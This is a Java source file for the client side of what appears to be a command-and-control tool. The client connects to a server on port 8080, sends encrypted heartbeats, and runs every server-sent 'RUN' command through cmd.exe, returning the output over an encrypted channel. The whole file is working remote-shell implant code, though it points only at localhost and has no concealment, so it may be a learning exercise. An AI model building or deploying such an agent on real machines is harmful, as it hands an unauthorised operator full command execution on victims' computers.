
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Client component.
 *
 * The client is responsible for:
 * - Establishing a persistent connection to the server on port 8080
 * - Registering itself with a unique ID upon connection
 * - Sending periodic heartbeats (every 10 seconds) to the server
 * - Receiving and executing commands from the server asynchronously
 * - Processing command results (including multi-line output) and sending them back
 * - Handling encrypted communication using CryptoUtils
 * - Gracefully shutting down when a KILL command is received or on connection loss
 *
 * The client uses a dedicated single-threaded executor (commandQueue) to process
 * incoming commands, ensuring that command execution does not block the main
 * communication loop.
 */

public class Client {

    private static final String HOST = "127.0.0.1";
    private final ExecutorService commandQueue = Executors.newSingleThreadExecutor();
    private static final int PORT = 8080;
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private int myId = -1;
    
    public Client() {}
    
    public void start() {
        try {
            socket = new Socket(HOST, PORT);
            out = new PrintWriter(socket.getOutputStream(), true);
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            
            Thread heartbeatThread = new Thread(() -> {
                while (!socket.isClosed()) {
                    try {
                        Thread.sleep(10000); // 10 seconds
                        if (out != null) {
                            synchronized (out) {
                                out.println(CryptoUtils.encrypt("PING"));
                            }
                        }
                    } catch (InterruptedException e) {
                        break;
                    }
                }
            });
            heartbeatThread.setDaemon(true);
            heartbeatThread.start();
            
            String rawMsg;
            while ((rawMsg = in.readLine()) != null) {
                String serverMsg = CryptoUtils.decrypt(rawMsg);
                if (serverMsg == null) continue;
                
                if (serverMsg.startsWith("ID ")) {
                    myId = Integer.parseInt(serverMsg.substring(3).trim());
                    System.out.println("[Client " + myId + "] Connected to server.");
                } 
                else if (serverMsg.startsWith("RUN ")) {
                    String command= serverMsg.substring(4);
                    commandQueue.execute(() -> {
                        System.out.println("[Client " + myId + "] Executing: " + command);
                        String result = executeSystemCommand(command);
                        if (out != null) {
                            synchronized (out) {
                                out.println(CryptoUtils.encrypt("RESULT_START"));
                                String[] lines = result.split("\n");
                                for (String line : lines) {
                                    if (!line.trim().isEmpty()) {
                                        out.println(CryptoUtils.encrypt(line));
                                    }
                                }
                                out.println(CryptoUtils.encrypt("RESULT_END"));
                            }
                        }
                    });
                } 
                else if (serverMsg.equals("KILL")) {
                    System.out.println("[Client " + myId + "] Kill received. Shutting down.");
                    break; 
                }
            }
            
        } 
        catch (IOException e) {
            System.err.println("Connection error: " + e.getMessage());
        } 
        finally {
            closeApp();
        }
    }

    private void closeApp() {
        commandQueue.shutdownNow();
        try {
            if (out != null) out.close();
            if (in != null) in.close();
            if (socket != null && !socket.isClosed()) socket.close();
        } 
        catch (IOException e) {
            throw new RuntimeException("Failed to close client streams", e);
        }
    }

    private String executeSystemCommand(String command) {
        StringBuilder output = new StringBuilder();
        try {
            // Runs command in powershell
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", command);
            pb.redirectErrorStream(true); // merges errors and output
            Process process = pb.start();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }
            
            int exitCode = process.waitFor();
            if (output.length() == 0) {
                return "Command executed, but returned no output (Exit Code: " + exitCode + ")";
            } 
        }
        catch (Exception e) {
            return "Error executing command: " + e.getMessage();
        }
        return output.toString().replace("\r", "");
        
    }

    public static void main(String[] args) {
        Client client = new Client();
        client.start();
    }
}
